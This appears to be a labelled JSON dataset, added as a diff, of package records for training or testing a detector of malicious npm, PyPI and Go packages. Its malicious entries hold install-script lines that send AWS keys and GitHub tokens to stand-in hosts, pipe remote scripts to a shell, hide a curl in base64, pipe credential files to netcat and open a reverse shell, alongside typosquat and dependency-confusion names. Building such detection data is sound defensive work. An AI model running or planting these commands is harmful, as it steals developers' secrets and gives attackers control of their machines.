@@ -1,0 +1,220 @@
+[
+  {
+    "name": "crossenv",
+    "ecosystem": "npm",
+    "scripts": {"postinstall": "node -e 'require(\"http\").get(\"http://evil.com/\"+process.env.AWS_SECRET_ACCESS_KEY)'"},
+    "label": "malicious",
+    "category": "typosquat_and_exfil"
+  },
+  {
+    "name": "requsts",
+    "ecosystem": "pypi",
+    "scripts": {"setup_py": "import os; os.system('curl http://malicious.org/backdoor.sh | sh')"},
+    "label": "malicious",
+    "category": "typosquat_and_rce"
+  },
+  {
+    "name": "color-picker-utility",
+    "ecosystem": "npm",
+    "scripts": {"preinstall": "child_process.exec(Buffer.from('Y3VybCBldmlsLmNvbQ==', 'base64').toString())"},
+    "label": "malicious",
+    "category": "obfuscated_preinstall"
+  },
+  {
+    "name": "fallguys",
+    "ecosystem": "npm",
+    "scripts": {"postinstall": "cat ~/.aws/credentials | nc 198.51.100.1 4444"},
+    "label": "malicious",
+    "category": "credential_theft"
+  },
+  {
+    "name": "urllib-secure",
+    "ecosystem": "pypi",
+    "scripts": {"setup_py": "import urllib.request, os; urllib.request.urlopen('http://exfil.net/?t='+os.environ['GITHUB_TOKEN'])"},
+    "label": "malicious",
+    "category": "env_exfiltration"
+  },
+  {
+    "name": "byteaegis-internal-auth",
+    "ecosystem": "npm",
+    "version": "99.9.9",
+    "label": "malicious",
+    "category": "dependency_confusion"
+  },
+  {
+    "name": "corp-payment-gateway",
+    "ecosystem": "npm",
+    "version": "999.0.0",
+    "label": "malicious",
+    "category": "dependency_confusion"
+  },
+  {
+    "name": "lod-ash",
+    "ecosystem": "npm",
+    "label": "malicious",
+    "category": "typosquat"
+  },
+  {
+    "name": "reactt",
+    "ecosystem": "npm",
+    "label": "malicious",
+    "category": "typosquat"
+  },
+  {
+    "name": "chslk",
+    "ecosystem": "npm",
+    "label": "malicious",
+    "category": "typosquat"
+  },
+  {
+    "name": "expresss",
+    "ecosystem": "npm",
+    "label": "malicious",
+    "category": "typosquat"
+  },
+  {
+    "name": "botoo3",
+    "ecosystem": "pypi",
+    "label": "malicious",
+    "category": "typosquat"
+  },
+  {
+    "name": "numpy-secure",
+    "ecosystem": "pypi",
+    "scripts": {"setup_py": "import os; os.system('nc -e /bin/sh 10.0.0.1 1337')"},
+    "label": "malicious",
+    "category": "reverse_shell"
+  },
+  {
+    "name": "lodash",
+    "ecosystem": "npm",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "react",
+    "ecosystem": "npm",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "express",
+    "ecosystem": "npm",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "axios",
+    "ecosystem": "npm",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "chalk",
+    "ecosystem": "npm",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "commander",
+    "ecosystem": "npm",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "uuid",
+    "ecosystem": "npm",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "dotenv",
+    "ecosystem": "npm",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "requests",
+    "ecosystem": "pypi",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "urllib3",
+    "ecosystem": "pypi",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "boto3",
+    "ecosystem": "pypi",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "botocore",
+    "ecosystem": "pypi",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "numpy",
+    "ecosystem": "pypi",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "pandas",
+    "ecosystem": "pypi",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "pydantic",
+    "ecosystem": "pypi",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "fastapi",
+    "ecosystem": "pypi",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "pytest",
+    "ecosystem": "pypi",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "flask",
+    "ecosystem": "pypi",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "click",
+    "ecosystem": "pypi",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "golang.org/x/crypto",
+    "ecosystem": "go",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "github.com/spf13/cobra",
+    "ecosystem": "go",
+    "label": "clean",
+    "category": "top_library"
+  },
+  {
+    "name": "github.com/stretchr/testify",
+    "ecosystem": "go",
+    "label": "clean",
+    "category": "top_library"
+  }
+]
